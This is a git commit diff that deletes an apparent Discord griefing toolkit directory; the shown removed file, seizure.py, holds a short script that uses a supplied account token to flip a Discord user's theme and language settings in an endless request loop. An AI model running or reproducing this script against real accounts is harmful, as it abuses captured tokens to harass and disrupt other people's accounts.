2ac22b2887c251d78a2a03e3c75282bab43a6758
Xvirus0 <131556346+Xvirus0@users.noreply.github.com>
2023-04-23 20:38:33 +0200

    Delete Xvirus-Tools directory

--- Xvirus-Tools/util/seizure.py
+++
@@ -1,9 +0,0 @@
-import requests
-import random
-
-from util.plugins.common import getheaders
-
-def StartSeizure(token):
-    while True:
-        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
-        requests.patch("https://discord.com/api/v7/users/@me/settings", headers=getheaders(token), json=setting)
